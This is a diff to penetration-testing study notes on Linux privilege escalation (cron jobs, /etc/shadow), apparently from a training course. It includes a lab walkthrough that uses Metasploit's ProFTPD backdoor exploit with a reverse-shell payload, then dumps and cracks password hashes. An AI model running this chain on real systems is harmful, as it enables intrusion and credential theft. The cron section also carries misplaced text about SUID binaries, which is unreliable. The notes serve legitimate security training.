@@ -390,6 +390,33 @@ Kernel exploits on Linux will typically target vulnerabilities in the Linux kern
 **Tools**
 
 - Linux-Exploit-Suggester: https://github.com/mzet-/linux-exploit-suggester
+
+
 ### Cron Jobs
 
-Linux implements task scheduling through a utility called Cron. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule. An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches. The crontab file is a configuration file that is used by the Cron utility to store and track Cron jobs that have been created. Cron jobs can also be run as any user on the system, this is a very important factor to keep an eye on as we will be targeting Cron jobs that have been configured to be run as the “root” user. This is primarily because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with root access. In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.
+Linux implements task scheduling through a utility called Cron. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule. An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches. The crontab file is a configuration file that is used by the Cron utility to store and track Cron jobs that have been created. Cron jobs can also be run as any user on the system, this is a very important factor to keep an eye on as we will be targeting Cron jobs that have been configured to be run as the “root” user. This is primarily because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with root access. In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.This is the functionality that we will be attempting to exploit in order to elevate our privileges, however, the success of our attack will depend on the following factors:
+- Owner of the SUID binary – Given that we are attempting to elevate our privileges, we will only be exploiting SUID binaries that are owned by the “root” user or other privileged users.
+- Access permissions – We will require executable permissions in order to execute the SUID binary.
+
+
+### Dumping Linux Password Hashes
+
+All of the information for all accounts on Linux is stored in the passwd file located in: /etc/passwd. We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system. All the encrypted passwords for the users are stored in the shadow file. It can be found in the following directory: /etc/shadow. The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords.
+
+
+### Practical Linux Password Cracker
+
+- `nmap -sV demo.ine.local` --> Running FTP service
+- `service postgresql start && msfconsole`
+- `setg RHOSTS 192.241.218.3`
+- `search proftpd`
+- `use exploit/unix/ftp/proftpd_133c_backdoor`
+- `set LHOST 192.241.218.2`
+- `set payload payload/cmd/unix/reverse`
+- `exploit -z` We have exploited the target ftp server. We will use a post exploitation module to dump the system users hashes.
+- `use post/linux/gather/hashdump`
+- `set SESSION 1`
+- `exploit`
+- `use auxiliary/analyze/crack_linux`
+- `set SHA512 true`
+- `run`
